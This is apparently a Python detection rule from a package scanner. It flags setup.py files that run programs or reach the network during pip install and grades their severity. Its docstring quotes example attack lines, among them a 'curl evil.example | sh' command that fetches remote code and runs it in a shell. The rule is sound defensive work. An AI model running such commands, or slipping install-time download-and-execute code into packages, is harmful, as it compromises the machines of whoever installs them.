"""setup.py that starts programs or uses the network when the package is installed.

`pip install` of an sdist runs its setup.py, so anything in it runs on the
victim's machine before they've imported (or even looked at) the package:

    os.system("curl evil.example | sh")              # process
    requests.get("https://evil.example/payload")     # network

Honest setup.py files mostly just call setup(), but some run build tools (`git
describe` for a version number, `cargo build`), so one kind of call alone is only
medium: not suspicious by itself, but it adds up with other signs.

- programs, or network calls                                -> medium
- both (e.g. download something, then run it)               -> high
- a program run with decoded or downloaded data             -> critical

Every call in setup.py counts, not only its top level: setuptools also runs the
methods of custom install commands. Network calls are the ones that connect
(NETWORK_REQUESTS), the same as for import_time_code.

Only the sdist counts: wheels are installed by copying files, without running setup.py.
"""

from __future__ import annotations

from crotalus.models import AnalysisContext, Finding, Severity
from crotalus.rules.helpers.static_code_analysis import (
    calls,
    calls_evidence,
    describe_calls,
    process_and_network_calls,
)


def check(context: AnalysisContext) -> list[Finding]:
    if context.sdist is None or "setup.py" not in context.sdist.python_files:
        return []

    found = process_and_network_calls({"setup.py": context.sdist.python_files["setup.py"]}, calls)
    severity: Severity
    if found.runs_hidden_data:
        severity = "critical"
    elif found.process_calls and found.network_calls:
        severity = "high"
    elif found.process_calls or found.network_calls:
        severity = "medium"
    else:
        return []

    return [
        Finding(
            rule_id="setup_py_install_time",
            severity=severity,
            message=f"setup.py {describe_calls(found)} at install time",
            evidence=calls_evidence(found, "sdist"),
        )
    ]
